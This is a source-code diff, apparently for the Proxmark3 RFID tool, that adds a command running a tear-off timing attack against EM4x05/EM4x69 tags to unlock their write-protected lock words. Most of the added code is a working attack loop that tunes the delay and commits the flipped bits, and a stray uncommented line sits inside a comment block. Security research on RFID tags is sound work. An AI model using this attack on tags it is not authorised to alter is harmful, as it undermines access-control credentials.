@@ -32,6 +32,7 @@
 #include "lfdemod.h"
 #include "generator.h"
 #include "cliparser.h"
+#include "cmdhw.h"
 
 static uint64_t g_em410xid = 0;
 
@@ -715,7 +716,7 @@ static bool EM_ColParityTest(uint8_t *bs, size_t size, uint8_t rows, uint8_t col
 static bool downloadSamplesEM(void) {
 
     // 8 bit preamble + 32 bit word response (max clock (128) * 40bits = 5120 samples)
-    uint8_t got[6000];
+    uint8_t got[5500];
     if (!GetFromDevice(BIG_BUF, got, sizeof(got), 0, NULL, 0, NULL, 2500, false)) {
         PrintAndLogEx(WARNING, "(downloadSamplesEM) command execution time out");
         return false;
@@ -1413,10 +1414,11 @@ static void printEM4x05info(uint32_t block0, uint32_t serial) {
     //  7,8, rfu
     //  9 - 18 customer code
     //  19,  rfu
-    
+              
        98765432109876543210
        001000000000
     // 00100000000001111000
+                   xxx----
     //                1100
     //             011
     // 00100000000
@@ -1643,6 +1645,366 @@ static int CmdEM4x05Chk(const char *Cmd) {
     return PM3_SUCCESS;
 }
 
+
+static int unlock_write_protect(bool use_pwd, uint32_t pwd, uint32_t data, bool verbose) {
+
+    struct {
+        uint32_t password;
+        uint32_t data;
+        uint8_t usepwd;
+    } PACKED payload;
+
+    payload.password = pwd;
+    payload.data = data;
+    payload.usepwd = use_pwd;
+
+    clearCommandBuffer();
+    SendCommandNG(CMD_LF_EM4X_PROTECTWORD, (uint8_t *)&payload, sizeof(payload));
+    PacketResponseNG resp;
+    if (WaitForResponseTimeout(CMD_LF_EM4X_PROTECTWORD, &resp, 2000) == false) {
+        PrintAndLogEx(ERR, "Error occurred, device did not respond during write operation.");
+        return PM3_ETIMEOUT;
+    }
+
+    if (!downloadSamplesEM())
+        return PM3_ENODATA;
+
+    uint32_t dummy = 0;
+    int status = demodEM4x05resp(&dummy, true);
+    if (status == PM3_SUCCESS && verbose)
+        PrintAndLogEx(SUCCESS, "Success writing to tag");
+    else if (status == PM3_EFAILED)
+        PrintAndLogEx(ERR, "Tag denied PROTECT operation");
+    else
+        PrintAndLogEx(DEBUG, "No answer from tag");
+    
+    return status;
+}
+static int unlock_reset(bool use_pwd, uint32_t pwd, uint32_t data) {
+    PrintAndLogEx(FAILED, "resetting the " _RED_("active") " lock block");
+    return unlock_write_protect(use_pwd, pwd, data, false);
+}
+
+static int CmdEM4x05Unlock(const char *Cmd) {
+
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "lf em 4x05_unlock",
+                  "execute tear off against EM4205/4305/4469/4569",
+                  "lf em 4x05_unlock\n"
+                  "lf em 4x05_unlock -s 4100 -e 4100       -> lock on and autotune at 4100us\n"
+                  "lf em 4x05_unlock -n 10 -s 3000 -e 4400 -> scan delays 3000us -> 4400us"
+                 );
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_u64_0("n", NULL, NULL, "steps to skip"),
+        arg_u64_0("s", "start", "<us>", "start scan from delay (us)"),
+        arg_u64_0("e", "end", "<us>", "end scan at delay (us)"),
+        arg_u64_0("p", "pwd", "", "password (0x00000000)"),        
+        arg_lit0("v", "verbose", "verbose output"),
+        arg_param_end        
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    uint64_t n = arg_get_u64_def(ctx, 1, 10);
+    uint64_t start = arg_get_u64_def(ctx, 2, 2000);
+    uint64_t end = arg_get_u64_def(ctx, 3, 6000);
+    uint64_t inputpwd = arg_get_u64_def(ctx, 4, 0xFFFFFFFFFFFFFFFF);
+    bool verbose = arg_get_lit(ctx, 5);
+    CLIParserFree(ctx);
+
+    if (session.pm3_present == false) {
+        PrintAndLogEx(WARNING, "device offline\n");
+        return PM3_ENODATA;
+    }
+
+    bool use_pwd = false;
+    uint32_t pwd = 0;
+    if (inputpwd != 0xFFFFFFFFFFFFFFFF) {
+        use_pwd = true;
+        pwd = inputpwd & 0xFFFFFFFF;
+    }
+
+    uint32_t search_value = 0;
+    uint32_t write_value = 0;
+    //    
+    // inital phase 
+    //
+    // read word 14
+    uint32_t init_14 = 0;
+    int res = EM4x05ReadWord_ext(14, pwd, use_pwd, &init_14);
+    if (res != PM3_SUCCESS) {
+        PrintAndLogEx(FAILED, "failed to read word 14\n");
+        return PM3_ENODATA;        
+    }
+
+        
+    // read 15 
+    uint32_t init_15 = 0;
+    res = EM4x05ReadWord_ext(15, pwd, use_pwd, &init_15);
+    if (res != PM3_SUCCESS) {
+        PrintAndLogEx(FAILED, "failed to read word 15\n");
+        return PM3_ENODATA;        
+    }
+
+
+#define UNLOCK_WORD 0x00008000
+    if (init_15 == UNLOCK_WORD) {
+        PrintAndLogEx(SUCCESS, "Tag already fully unlocked, nothing to do");
+        return PM3_SUCCESS;
+    }
+
+#define ACTIVE_MASK 0x00008000
+    if ((init_15 & ACTIVE_MASK) == ACTIVE_MASK) {
+        search_value = init_15;
+    } else {
+        search_value = init_14;
+    }
+
+
+    bool my_auto = false;
+    if (n == 0) {
+        my_auto = true;
+        n = (end - start) / 2;
+    } else {       
+        if ( start > end ) {
+            PrintAndLogEx(FAILED, "start delay can\'t be larger than end delay %u vs %u", start, end);
+            return PM3_EINVARG;
+        }
+    }
+    
+    // fix at one specific delay
+    if (start == end) {
+        n = 0;
+    }
+    
+    PrintAndLogEx(INFO, "--------------- " _CYAN_("EM4x05 tear-off : target PROTECT") " -----------------------\n");    
+
+     PrintAndLogEx(INFO, " Word 14,15 inital [ " _GREEN_("%08"PRIX32) ", " _GREEN_("%08"PRIX32)  " ]", init_14, init_15);
+
+    if (use_pwd) {
+        PrintAndLogEx(INFO, "   target password [ " _GREEN_("%08"PRIX32) " ]", pwd);
+    }
+    if (my_auto) {
+        PrintAndLogEx(INFO, "    automatic mode [ " _GREEN_("enabled") " ]");
+    }
+
+    PrintAndLogEx(INFO, "   target stepping [ " _GREEN_("%u") " ]", n);
+    PrintAndLogEx(INFO, "target delay range [ " _GREEN_("%"PRIu32) " ... " _GREEN_("%"PRIu32) " ]", start, end);
+    PrintAndLogEx(INFO, "      search value [ " _GREEN_("%08"PRIX32) " ]", search_value);        
+    PrintAndLogEx(INFO, "       write value [ " _GREEN_("%08"PRIX32) " ]", write_value);        
+
+    PrintAndLogEx(INFO, "----------------------------------------------------------------------------\n");
+    PrintAndLogEx(INFO, "press " _YELLOW_("'enter'") " to cancel the command");
+
+    int exit_code = PM3_SUCCESS;
+    uint32_t word14 = 0, word15 = 0;
+    uint32_t tries = 0;
+    uint32_t soon = 0;
+    uint32_t late = 0;
+    //
+    // main loop
+    //
+    //uint32_t prev_delay = 0;
+    
+    uint64_t t1 = msclock();
+    while (start <= end) {
+
+        if (my_auto && n < 1) {
+            PrintAndLogEx(INFO, "Reached n < 1                    => " _YELLOW_("disabling automatic mode"));
+            end = start;
+            my_auto = false;
+            n = 0;
+        }
+
+        if (my_auto == false) {
+            start += n;
+        }
+
+        if (tries >= 5 && n == 0 && soon != late) {
+            
+            if (soon > late) {
+                PrintAndLogEx(INFO, "Tried %d times, soon:%i late:%i     => " _CYAN_("adjust +1us >> %u us"), tries, soon, late, start);
+                start++;
+                end++;
+            } else {
+                PrintAndLogEx(INFO, "Tried %d times, soon:%i late:%i     => " _CYAN_("adjust -1us >> %u us"), tries, soon, late, start);
+                start--;
+                end--;
+            }
+            tries = 0;
+            soon = 0;
+            late = 0;
+        }
+
+
+
+        if (is_cancelled()) {
+            exit_code = PM3_EOPABORTED;
+            break;
+        }
+
+        /*
+        if ( start != prev_delay) {
+            PrintAndLogEx(INFO, "Tear-off delay hook configured      => " _GREEN_("%u us"), start);
+            prev_delay = start;
+        }
+        */
+            
+        // set tear off trigger
+        clearCommandBuffer();    
+        tearoff_params_t params = {
+            .delay_us = start,
+            .on = true,
+            .off = false
+        };
+        res = handle_tearoff(&params, verbose); 
+        if ( res != PM3_SUCCESS ) {
+            PrintAndLogEx(WARNING, "failed to configure tear off");
+            return PM3_EOPABORTED;
+        }
+
+        // write
+        res = unlock_write_protect(use_pwd, pwd, write_value, verbose);
+        
+        // read after trigger
+        res = EM4x05ReadWord_ext(14, pwd, use_pwd, &word14);
+        if (res == PM3_SUCCESS) {
+            //PrintAndLogEx(INFO, "14 after [ " _GREEN_("%08"PRIX32) " ]", word14);            
+        } else {
+            continue;
+        }
+
+        // read after trigger
+        res = EM4x05ReadWord_ext(15, pwd, use_pwd, &word15);
+        if (res == PM3_SUCCESS) {
+            //PrintAndLogEx(INFO, "15 after [ " _GREEN_("%08"PRIX32) " ]", word15);
+        } else {
+            continue;
+        }
+
+        PrintAndLogEx(INFO, "ref:%08X   14:%08X   15:%08X ", search_value, word14, word15);
+        
+        if ( word14 == search_value && word15 == 0) {
+            PrintAndLogEx(INFO, "Status: Nothing happened            => " _GREEN_("tearing too soon"));
+            
+            if (my_auto) {
+                start += n;
+                n /= 2;
+                PrintAndLogEx(INFO, "Adjusting params: n %i  start %i  end %i", n, start, end);
+            } else {
+                soon++;
+            }
+        } else {
+            
+            if (word15 == search_value) {
+                
+                if (word14 == 0) {
+                    PrintAndLogEx(INFO, "Status: Protect succeeded           => " _GREEN_("tearing too late"));
+                } else {
+                    if ( word14 == search_value) {
+                         PrintAndLogEx(INFO, "Status: 15 ok, 14 not yet erased    => " _GREEN_("tearing too late"));
+                    } else {
+                         PrintAndLogEx(INFO, "Status: 15 ok, 14 partially erased  => " _GREEN_("tearing too late"));
+                    }                    
+                }
+                unlock_reset(use_pwd, pwd, write_value);
+                
+                // read after reset
+                res = EM4x05ReadWord_ext(14, pwd, use_pwd, &word14);
+                if (res != PM3_SUCCESS) {
+                    continue;
+                }
+
+                if (word14 == 0) {
+                    unlock_reset(use_pwd, pwd, write_value);                    
+                }
+                
+                if (word14 != search_value) {
+
+                    // read after reset
+                    res = EM4x05ReadWord_ext(15, pwd, use_pwd, &word15);
+                    if (res == PM3_SUCCESS) {
+                        PrintAndLogEx(INFO, "Status: new definitive value!       => " _RED_("SUCCESS:") " 14: " _CYAN_("%08X") "  15: %08X", word14, word15);
+                        break;
+                    } else {
+                        continue;
+                    }
+                }
+                if (my_auto) {
+                    end = start;
+                    start -= n;
+                    n /= 2;
+                    PrintAndLogEx(INFO, "Adjusting params: n %i  start %i  end %i", n, start, end);
+                } else {
+                    late++;
+                }
+
+            } else {
+                
+                if (( word15 & ACTIVE_MASK) == ACTIVE_MASK) {
+                    
+                    PrintAndLogEx(INFO, "Status: 15 bitflipped and active    => " _RED_("SUCCESS?:  ") "14: %08X  15: " _CYAN_("%08X"), word14, word15);
+                    PrintAndLogEx(INFO, "Committing results...");
+
+                    unlock_reset(use_pwd, pwd, write_value);    
+                    // read after reset
+                    res = EM4x05ReadWord_ext(14, pwd, use_pwd, &word14);
+                    if ( res != PM3_SUCCESS ) {
+                        PrintAndLogEx(WARNING, "failed to read 14");
+                        return PM3_EOPABORTED;
+                    }
+                    res = EM4x05ReadWord_ext(15, pwd, use_pwd, &word15);
+                    if ( res != PM3_SUCCESS ) {
+                        PrintAndLogEx(WARNING, "failed to read 15");
+                        return PM3_EOPABORTED;
+                    }
+                    
+                    PrintAndLogEx(INFO, "ref:%08x   14:%08X   15:%08X", search_value, word14, word15);
+                    
+                    if ((word14 & ACTIVE_MASK) == ACTIVE_MASK) {
+                        
+                        if (word14 == word15) {
+                            PrintAndLogEx(INFO, "Status: confirmed                   => " _RED_("SUCCESS:   ") "14: " _CYAN_("%08X") "  15: %08X", word14, word15);
+                            break;
+                        }
+                        
+                        if (word14 != search_value) {
+                            PrintAndLogEx(INFO, "Status: new definitive value!       => " _RED_("SUCCESS:   ") "14: " _CYAN_("%08X") "  15: %08X", word14, word15);
+                            break;
+                        }
+                        
+                        PrintAndLogEx(INFO, "Status: failed to commit bitflip        => " _RED_("FAIL:      ") "14: %08X  15: %08X", word14, word15);
+                    } else {
+                        PrintAndLogEx(INFO, "Status: 15 bitflipped but inactive      => " _YELLOW_("PROMISING: ") "14: %08X  15: " _CYAN_("%08X"), word14, word15);
+                        
+                    }
+                    
+                    if (my_auto) {
+                        n = 0;
+                        end = start;
+                    } else {
+                        tries = 0;
+                        soon = 0;
+                        late = 0;
+                    }
+                }
+            }
+        }
+        
+        if (my_auto == false) {
+            tries++;
+        }
+    }
+
+    PrintAndLogEx(INFO, "----------------------------- " _CYAN_("exit") " ----------------------------------\n");
+    t1 = msclock() - t1;
+    PrintAndLogEx(SUCCESS, "\ntime in unlock " _YELLOW_("%.0f") " seconds\n", (float)t1 / 1000.0);
+    PrintAndLogEx(INFO, "try " _YELLOW_("`lf em 4x05_dump`"));
+    PrintAndLogEx(NORMAL, "");
+    return exit_code;
+}
+
 static command_t CommandTable[] = {
     {"help",        CmdHelp,              AlwaysAvailable, "This help"},
     {"----------",  CmdHelp,              AlwaysAvailable,         "----------------------- " _CYAN_("EM 410x") " -----------------------"},
@@ -1662,6 +2024,7 @@ static command_t CommandTable[] = {
     {"4x05_info",   CmdEM4x05Info,        IfPm3Lf,         "tag information EM4x05/EM4x69"},
     {"4x05_read",   CmdEM4x05Read,        IfPm3Lf,         "read word data from EM4x05/EM4x69"},
     {"4x05_write",  CmdEM4x05Write,       IfPm3Lf,         "write word data to EM4x05/EM4x69"},
+    {"4x05_unlock", CmdEM4x05Unlock,      IfPm3Lf,         "execute tear off against EM4x05/EM4x69"},
     {"----------",  CmdHelp,              AlwaysAvailable,         "----------------------- " _CYAN_("EM 4x50") " -----------------------"},
     {"4x50_dump",   CmdEM4x50Dump,        IfPm3EM4x50,     "dump EM4x50 tag"},
     {"4x50_info",   CmdEM4x50Info,        IfPm3EM4x50,     "tag information EM4x50"},
